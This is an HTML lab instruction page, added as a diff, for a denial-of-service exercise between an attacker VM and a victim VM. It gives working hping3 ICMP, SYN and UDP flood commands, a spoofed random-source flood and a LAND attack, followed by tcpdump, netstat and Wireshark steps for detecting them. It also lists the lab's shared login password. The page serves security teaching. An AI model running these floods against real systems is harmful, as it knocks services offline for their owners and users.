@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hping3 Experiment Instructions</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        h2 {
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 5px;
+            border-radius: 5px;
+        }
+        pre {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+        }
+        ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>hping3 Experiment Instructions</h2>
+
+        <h3>Step 1: Login to Both Systems</h3>
+        <ul>
+            <li><strong>Attacker System (Ubuntu):</strong> Password: <code>VSecureSphere</code></li>
+            <li><strong>Victim System (Ubuntu):</strong> Password: <code>VSecureSphere</code></li>
+        </ul>
+
+        <h3>Step 2: Find the IP Address of the Victim</h3>
+        <p>Inside the victim system, open a terminal and run:</p>
+        <pre><code>ip a</code></pre>
+        <p>Note down the IP address of the victim system.</p>
+
+        <h3>Step 3: Perform the DoS Attack Using hping3</h3>
+        <p>Open a terminal inside the Ubuntu attacker system and execute the following commands.</p>
+
+        <h4>1. ICMP Flood Attack</h4>
+        <pre><code>sudo hping3 --icmp --flood &lt;victim-IP&gt;</code></pre>
+        <p>Expected Effect: Victim system slows down due to excessive ICMP packets.</p>
+
+        <h4>2. TCP SYN Flood Attack</h4>
+        <pre><code>sudo hping3 -S -p 80 &lt;victim-IP&gt; --flood</code></pre>
+        <p>Expected Effect: High CPU usage on the victim, affecting web services.</p>
+
+        <h4>3. UDP Flood Attack</h4>
+        <pre><code>sudo hping3 --udp --flood -p 53 &lt;victim-IP&gt;</code></pre>
+        <p>Expected Effect: The Ubuntu victim may become unresponsive due to excessive UDP requests.</p>
+
+        <h4>4. Random Source Attack</h4>
+        <pre><code>sudo hping3 -S -p 80 &lt;victim-IP&gt; --flood --rand-source</code></pre>
+        <p>Expected Effect: Hard to trace the attack, logs show random IP sources.</p>
+
+        <h4>5. LAND Attack</h4>
+        <pre><code>sudo hping3 -S -p 80 &lt;victim-IP&gt; -a &lt;victim-IP&gt;</code></pre>
+        <p>Expected Effect: The Ubuntu victim may crash due to self-traffic confusion.</p>
+
+        <h3>Step 4: Monitoring the Attack on the Victim</h3>
+        <h4>1. Check CPU and Network Usage</h4>
+        <p>Open a terminal in the Ubuntu victim system and run:</p>
+        <pre><code>top</code></pre>
+        <p>or check network statistics:</p>
+        <pre><code>sudo ss -tulnp</code></pre>
+
+        <h4>2. Monitor Traffic with tcpdump</h4>
+        <p>Open a terminal inside the Ubuntu victim system and start capturing packets from the attacker.</p>
+        <p>To capture all packets from the attacker:</p>
+        <pre><code>sudo tcpdump -i eth0 src host &lt;attacker-IP&gt;</code></pre>
+        <p>To capture only TCP SYN packets (SYN Flood Attack):</p>
+        <pre><code>sudo tcpdump -i eth0 src host &lt;attacker-IP&gt; and tcp[tcpflags] & tcp-syn != 0</code></pre>
+        <p>To capture only ICMP packets (Ping Flood Attack):</p>
+        <pre><code>sudo tcpdump -i eth0 icmp</code></pre>
+        <p>To capture only UDP packets (UDP Flood Attack):</p>
+        <pre><code>sudo tcpdump -i eth0 udp</code></pre>
+        <p>To save traffic for later analysis in Wireshark:</p>
+        <pre><code>sudo tcpdump -i eth0 -w attack-traffic.pcap</code></pre>
+        <p>Press <code>CTRL + C</code> to stop capturing packets.</p>
+
+        <h4>3. Detect with Netstat</h4>
+        <pre><code>netstat -ant | grep SYN_RECV</code></pre>
+        <p>If too many <code>SYN_RECV</code> connections appear, the attack is working.</p>
+
+        <h4>4. Analyze Traffic Using Wireshark</h4>
+        <p>To analyze the captured traffic visually, open Wireshark and follow these steps:</p>
+        <ul>
+            <li>Open Wireshark on the victim system.</li>
+            <li>Start capturing packets on the relevant network interface (e.g., <code>eth0</code>).</li>
+            <li>Apply filters such as:</li>
+            <pre><code>icmp</code></pre>
+            <p>(For ICMP Flood Attack)</p>
+            <pre><code>tcp.flags.syn == 1</code></pre>
+            <p>(For SYN Flood Attack)</p>
+            <pre><code>udp</code></pre>
+            <p>(For UDP Flood Attack)</p>
+            <li>Analyze the packet flow and note unusual spikes in network traffic.</li>
+        </ul>
+    </div>
+</body>
+</html>
